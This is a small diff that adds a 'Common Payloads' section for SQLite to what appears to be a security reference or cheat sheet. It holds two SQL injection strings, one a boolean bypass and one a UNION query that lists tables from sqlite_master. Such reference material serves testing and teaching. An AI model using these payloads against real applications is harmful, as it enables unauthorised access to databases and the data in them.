@@ -1095,6 +1095,13 @@ or
 
 #### SQLite
 
+##### Common Payloads
+
+```console
+' OR 1=1 LIMIT 1 OFFSET 5 --
+' UNION SELECT null, tbl_name, null, null, null, null, null FROM sqlite_master --
+```
+
 ##### Extracting Table Names
 
 ```console
